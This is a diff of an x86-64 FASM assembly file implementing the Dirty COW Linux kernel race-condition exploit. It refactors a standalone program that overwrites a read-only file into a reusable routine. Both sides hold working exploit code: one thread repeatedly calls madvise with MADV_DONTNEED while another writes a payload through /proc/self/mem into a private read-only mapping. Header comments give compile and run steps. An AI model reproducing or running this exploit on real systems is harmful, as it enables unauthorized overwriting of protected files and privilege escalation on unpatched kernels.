@@ -1,172 +1,84 @@
-;create readonly file and check
-;> sudo cat 'hello world' > test.txt
-;> sudo chmod -w test.txt
-;> sudo -k
-;> ls -l test.txt
-;> cat test.txt
-;compile
-;> fasm ./dirtycow.fasm ./dirtycow
-;and execute
-;> ./dirtycow
-;> cat text.txt
-
-format                                  ELF64                                   executable
-use64
-entry                                   _start_
-macro sys_call                          doIt
-{
-  mov                                   rax,                                    doIt
-  syscall
-}
-macro clone                             func,                                   stck
-{
-  xor                                   r8,                                     r8
-  xor                                   r10,                                    r10
-  xor                                   rdx,                                    rdx
-  lea                                   rsi,                                    [ stck ]
-  mov                                   rdi,                                    0x50f00
-  sys_call                              56
-  or                                    rax,                                    rax
-  jz                                    func
-}
-macro nanosleep                         sec,                                    nsec
-{
-  if ( sec eq )
-    display                             '[asm] fail: seconds undefined in nanosleep!'
-    err
-  end if
-  mov                                   qword [ time.s ],                       sec
-  if ( nsec eq )
-    mov                                 qword [ time.n ],                       0
-  else
-    mov                                 qword [ time.n ],                       nsec
-  end if
-  xor                                   rsi,                                    rsi
-  lea                                   rdi,                                    [ time.s ]
-  sys_call                              35
-}
-
-segment                                 executable                              readable                                writeable
-  _start_:
-    lea                                 rdi,                                    [ fDirtycow ]
-    lea                                 rsi,                                    [ msgDirtycow ]
-    mov                                 rdx,                                    msgDirtycow.size
-    call                                dirtycow
-    xor                                 rax,                                    rax
-    sys_call                            60
-  dirtycow:
-  ;( I/O )
+dirtycow:
+;( I/O )
+;{
+;:  rdi sys0arg                         *filename                               unknown
+;:  rsi sys1arg                         *payload                                unknown
+;:  rdx sys2arg                         len(*payload)                           unknown
+;}
+;{
+  mov                                   qword [ .filename ],                    sys0arg
+  mov                                   qword [ .payload ],                     sys1arg
+  mov                                   qword [ .payload.length ],              sys2arg
+  ;mov                                   sys1arg,                                ( file_modeR )
+  null                                  sys1arg
+  sys_call                              sys_open
+  mov                                   qword [ .filedesc ],                    sys0ret
+  lea                                   sys1arg,                                [ .fstat ]
+  mov                                   sys0arg,                                sys0ret
+  sys_call                              sys_fstat
+  mov                                   sys4arg,                                qword [ .filedesc ]
+  null                                  sys5arg
+  mov                                   sys3arg,                                MMAP_fPrivate
+  mov                                   sys2arg,                                MMAP_pReadable
+  mov                                   sys1arg,                                qword [ .fstat.size ]
+  add                                   sys1arg,                                ( page_size - 1 )
+  and                                   sys1arg,                                ( 0 - page_size )
+  null                                  sys0arg
+  sys_call                              sys_mmap
+  mov                                   qword [ .map ],                         sys0ret
+  clone                                 .child0,                                rsp
+  mov                                   qword [ .childs + 0 * __qword__ ],      sys0ret
+  clone                                 .child1,                                rsp
+  mov                                   qword [ .childs + 1 * __qword__ ],      sys0ret
+  @@:
+  nanosleep                             null,                                   ( 10 * 1000 * 1000 )
+  cmp                                   qword [ .childs + 0 * __qword__ ],      null
+  jnz                                   @b
+  @@:
+  nanosleep                             null,                                   ( 10 * 1000 * 1000 )
+  cmp                                   qword [ .childs + 1 * __qword__ ],      null
+  jnz                                   @b
+  ret
+  .child0:
   ;{
-  ;:  rdi                               *filename                               unknown
-  ;:  rsi                               *payload                                unknown
-  ;:  rdx                               len(*payload)                           unknown
-  ;}
-  ;{
-    mov                                 qword [ .filename ],                    rdi
-    mov                                 qword [ .payload ],                     rsi
-    mov                                 qword [ .payload.length ],              rdx
-    xor                                 rsi,                                    rsi
-    sys_call                            2
-    mov                                 qword [ .filedesc ],                    rax
-    lea                                 rsi,                                    [ .fstat ]
-    mov                                 rdi,                                    rax
-    sys_call                            5
-    mov                                 r8,                                     qword [ .filedesc ]
-    xor                                 r9,                                     r9
-    mov                                 r10,                                    2
-    mov                                 rdx,                                    1
-    mov                                 rsi,                                    qword [ .fstat.size ]
-    add                                 rsi,                                    ( 4095 )
-    and                                 rsi,                                    ( -4096 )
-    xor                                 rdi,                                    rdi
-    sys_call                            9
-    mov                                 qword [ .map ],                         rax
-    clone                               .child0,                                rsp
-    mov                                 qword [ .childs + 0 * 8 ],              rax
-    clone                               .child1,                                rsp
-    mov                                 qword [ .childs + 1 * 8 ],              rax
+    null                                r12
+    mov                                 r15,                                    qword [ .map ]
+    mov                                 rbx,                                    ( 8 * 1024 * 1024 * 1024 )
     @@:
-    nanosleep                           0,                                      ( 10 * 1000 * 1000 )
-    cmp                                 qword [ .childs + 0 * 8 ],              0
+      mov                               sys2arg,                                MADV_DONTNEED
+      mov                               sys1arg,                                100
+      mov                               sys0arg,                                r15
+      sys_call                          sys_madvise
+      lea                               r12,                                    [ r12 + sys0ret ]
+      dec                               rbx
     jnz                                 @b
-    @@:
-    nanosleep                           0,                                      ( 10 * 1000 * 1000 )
-    cmp                                 qword [ .childs + 1 * 8 ],              0
-    jnz                                 @b
-    ret
-    .child0:
-    ;{
-      xor                               r12,                                    r12
-      mov                               r15,                                    qword [ .map ]
-      mov                               rbx,                                    ( 8 * 1024 * 1024 * 1024 )
-      @@:
-        mov                             rdx,                                    4
-        mov                             rsi,                                    100
-        mov                             rdi,                                    r15
-        sys_call                        28
-        lea                             r12,                                    [ r12 + rax ]
-        dec                             rbx
-      jnz                               @b
-      mov                               qword [ .childs + 0 * 8 ],              0
-      sys_call                          60
-    ;}
-    .child1:
-    ;{
-      xor                               rsi,                                    rsi
-      lea                               rdi,                                    [ .fmem ]
-      sys_call                          2
-      mov                               r15,                                    rax
-      mov                               r14,                                    qword [ .payload ]
-      mov                               r13,                                    qword [ .payload.length ]
-      xor                               r12,                                    r12
-      mov                               r10,                                    qword [ .map ]
-      mov                               rbx,                                    ( 8 * 1024 * 1024 * 1024 )
-      @@:
-        xor                             rdx,                                    rdx
-        mov                             rsi,                                    r10
-        mov                             rdi,                                    r15
-        sys_call                        8
-        mov                             rdx,                                    r13
-        mov                             rsi,                                    r14
-        mov                             rdi,                                    r15
-        sys_call                        1
-        lea                             r12,                                    [ r12 + rax ]
-        dec                             rbx
-      jnz                               @b
-      mov                               qword [ .childs + 1 * 8 ],              0
-      sys_call                          60
-    ;}
+    mov                                 qword [ .childs + 0 * __qword__ ],      null
+    sys_call                            sys_exit
   ;}
-  fDirtycow                             db                                      './test.txt', 0
-  msgDirtycow                           db                                      '<this should not be here!>', 10
-  msgDirtycow.size                      =                                       $ - msgDirtycow
-  dirtycow.fmem                         db                                      '/proc/self/mem', 0
-  time.s                                rq                                      1
-  time.n                                rq                                      1
-  dirtycow.childs                       rq                                      1
-  dirtycow.filename                     rq                                      1
-  dirtycow.filedesc                     rq                                      1
-  dirtycow.payload                      rq                                      1
-  dirtycow.payload.length               rq                                      1
-  dirtycow.map                          rq                                      1
-  dirtycow.fstat:
+  .child1:
   ;{
-    .dev                                rq                                      1
-    .ino                                rq                                      1
-    .nlink                              rq                                      1
-    .mode                               rd                                      1
-    .uid                                rd                                      1
-    .gid                                rd                                      1
-    .zero                               rd                                      1
-    .rdev                               rq                                      1
-    .size                               rq                                      1
-    .blksize                            rq                                      1
-    .blocks                             rq                                      1
-    .atime                              rq                                      1
-    .atime_nsec                         rq                                      1
-    .mtime                              rq                                      1
-    .mtime_nsec                         rq                                      1
-    .ctime                              rq                                      1
-    .ctime_nsec                         rq                                      1
+    mov                                 sys1arg,                                ( file_modeRW )
+    lea                                 sys0arg,                                [ .fmem ]
+    sys_call                            sys_open
+    mov                                 r15,                                    sys0ret
+    mov                                 r14,                                    qword [ .payload ]
+    mov                                 r13,                                    qword [ .payload.length ]
+    null                                r12
+    mov                                 r10,                                    qword [ .map ]
+    mov                                 rbx,                                    ( 8 * 1024 * 1024 * 1024 )
+    @@:
+      null                              sys2arg
+      mov                               sys1arg,                                r10
+      mov                               sys0arg,                                r15
+      sys_call                          sys_lseek
+      mov                               sys2arg,                                r13
+      mov                               sys1arg,                                r14
+      mov                               sys0arg,                                r15
+      sys_call                          sys_write
+      lea                               r12,                                    [ r12 + sys0ret ]
+      dec                               rbx
+    jnz                                 @b
+    mov                                 qword [ .childs + 1 * __qword__ ],      null
+    sys_call                            sys_exit
   ;}
-
+;}
